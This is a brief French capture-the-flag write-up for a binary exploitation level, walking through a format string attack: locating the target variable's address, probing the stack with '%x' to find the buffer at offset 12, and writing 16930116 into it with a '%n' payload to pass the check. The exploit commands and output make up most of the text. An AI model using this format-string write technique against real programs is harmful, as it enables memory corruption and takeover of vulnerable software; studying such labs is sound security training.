C'est exactement la meme chose qu'au niveau 3.

sauf que le m doit etre egal a 16930116 donc on ne fera pas exactement la meme chose, mais on va utiliser une variante de %d qui permet d'imprimer des caractere vide
a l'interieur de printf

l'adresse m se trouve cette fois a 08049810.

p &m sur gdb ou bien ghidra

il faut qu'on trouve a quelle place dans la stack se situe le debut de notre buffer

python -c 'print "eeee" + " %x" * 20' > /tmp/payload

on obtient :
aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 65656565 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825

donc a la 12eme place

on refait la meme chose : python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/payload

cat /tmp/payload | ./level4

nous avons passer la condition et obtenu le flag